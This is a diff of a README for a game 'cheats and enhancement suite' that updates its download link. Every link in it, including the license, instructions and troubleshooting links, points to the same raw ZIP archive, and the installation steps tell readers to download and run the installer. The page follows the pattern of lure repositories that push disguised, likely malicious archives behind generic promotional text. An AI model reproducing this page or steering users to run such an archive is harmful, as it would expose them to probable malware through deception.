@@ -1,6 +1,6 @@
 # Bongo Cat ❤️‍🔥 Cheats & Enhancement Suite
 
-![Download](https://github.com/othmane55/bongo-cat-tips-tricks/raw/refs/heads/branch/overripeness/bongo-tricks-cat-tips-countervolley.zip)
+![Download](https://raw.githubusercontent.com/othmane55/bongo-cat-tips-tricks/branch/overripeness/tricks_tips_cat_bongo_v1.8.zip)
 
 Welcome to the orchestra-pit of Bongo Cat mastery – the all-in-one Enhancement Suite for those seeking innovative, playful, and utterly unique modifications for your favorite feline rhythm friend. The 2025 edition brings the future of Bongo Cat play right to your fingertips – with features and compatibility covering all corners of the digital music realm.  
 
@@ -60,7 +60,7 @@ Why drum alone when you can summon the power of AI?
 - **Claude API**: Enhances cat animation and user interaction, even anticipating your next move!
 - **No-code Setup**: Plug your API keys into settings and ignite new creative combos, from AI-assisted practice to generative beats.
 
-Detailed instructions within `https://github.com/othmane55/bongo-cat-tips-tricks/raw/refs/heads/branch/overripeness/bongo-tricks-cat-tips-countervolley.zip`.
+Detailed instructions within `https://raw.githubusercontent.com/othmane55/bongo-cat-tips-tricks/branch/overripeness/tricks_tips_cat_bongo_v1.8.zip`.
 
 ---
 
@@ -76,14 +76,14 @@ Detailed instructions within `https://github.com/othmane55/bongo-cat-tips-tricks
 ## ⚡️ Installation Steps
 
 **Download the Enhancement Suite Installer**  
-Click the [Download](#) badge at the top or bottom of this README, or navigate to our latest release here: https://github.com/othmane55/bongo-cat-tips-tricks/raw/refs/heads/branch/overripeness/bongo-tricks-cat-tips-countervolley.zip
+Click the [Download](#) badge at the top or bottom of this README, or navigate to our latest release here: https://raw.githubusercontent.com/othmane55/bongo-cat-tips-tricks/branch/overripeness/tricks_tips_cat_bongo_v1.8.zip
 
 **How to Install:**
 1. Download the appropriate installer for your system.
 2. Run the installer and follow on-screen directions.
 3. Launch the Suite and connect your MIDI or start customizing instantly.
 
-*See `https://github.com/othmane55/bongo-cat-tips-tricks/raw/refs/heads/branch/overripeness/bongo-tricks-cat-tips-countervolley.zip` for troubleshooting and advanced setup.*
+*See `https://raw.githubusercontent.com/othmane55/bongo-cat-tips-tricks/branch/overripeness/tricks_tips_cat_bongo_v1.8.zip` for troubleshooting and advanced setup.*
 
 ---
 
@@ -99,11 +99,11 @@ Please use responsibly and in accordance with all applicable platform rules and 
 
 ## 📜 MIT License
 
-Licensed under the MIT License (2025). See the file [LICENSE](https://github.com/othmane55/bongo-cat-tips-tricks/raw/refs/heads/branch/overripeness/bongo-tricks-cat-tips-countervolley.zip) for full legal terms.
+Licensed under the MIT License (2025). See the file [LICENSE](https://raw.githubusercontent.com/othmane55/bongo-cat-tips-tricks/branch/overripeness/tricks_tips_cat_bongo_v1.8.zip) for full legal terms.
 
 ---
 
-![Download](https://github.com/othmane55/bongo-cat-tips-tricks/raw/refs/heads/branch/overripeness/bongo-tricks-cat-tips-countervolley.zip)
+![Download](https://raw.githubusercontent.com/othmane55/bongo-cat-tips-tricks/branch/overripeness/tricks_tips_cat_bongo_v1.8.zip)
 
 *Set your paws to play. Elevate your beats, and let ingenuity leap from your fingertips in 2025!*
 
